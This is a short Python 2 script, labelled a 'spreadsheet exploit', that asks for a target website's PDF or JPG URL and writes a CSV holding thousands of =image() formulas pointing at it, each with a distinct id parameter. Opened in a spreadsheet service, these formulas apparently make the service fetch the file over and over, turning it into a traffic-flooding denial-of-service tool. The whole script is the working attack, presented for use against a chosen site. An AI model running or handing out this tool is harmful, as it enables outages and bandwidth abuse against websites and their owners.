#!/usr/bin/python
# -*- coding: utf-8 -*-
# spreadsheet exploit by Hazy

import time as t
import os 


logo = '''
                              _     _               _                     _       _ _   
                             | |   | |             | |                   | |     (_) |
 ___ _ __  _ __ ___  __ _  __| |___| |__   ___  ___| |_    _____  ___ __ | | ___  _| |_ 
/ __| '_ \| '__/ _ \/ _` |/ _` / __| '_ \ / _ \/ _ \ __|  / _ \ \/ / '_ \| |/ _ \| | __|
\__ \ |_) | | |  __/ (_| | (_| \__ \ | | |  __/  __/ |_  |  __/>  <| |_) | | (_) | | |_ 
|___/ .__/|_|  \___|\__,_|\__,_|___/_| |_|\___|\___|\__|  \___/_/\_\ .__/|_|\___/|_|\__|
    | |                                                            | |                  
    |_|                                                            |_|                  

'''

def main():
    print logo
    try:
	print("Find a JPG or PDF file on the website eg http://targetsite/file.pdf")
    	site = raw_input('website to test > ')
    	try:
	    print("\nAmount of Parameters ID strings to use (recommended below 10,000)")
    	    lines = int(raw_input("Amount of ID parameters > "))
    	except ValueError:
		print("\nMake sure you type a number for the amount of ID parameters")
    		t.sleep(3)
		main()
        name = ("=image(\"{}?id=".format(site))
	
	file = open('spreadsheet.csv', 'w')
	test = 0
	while test < lines:
		test = test + 1
		creator = ("{}{}\")\n".format(name, test))
		file.writelines(creator)
        answer1 = raw_input('\nFile saved as spreadsheet.csv Do you want to exit? [Y/n]')
    	if answer1.lower() == 'n':
	        main()
        else:
                print('Closing') 
    	        file.close()
    	        exit() 
    except KeyboardInterrupt:
		answer = raw_input('\n\nDo you want to exit? [Y/n]')
    		if answer.lower() == 'n':
			main()
    		else:
			print('Closing')    
    			exit()

main()

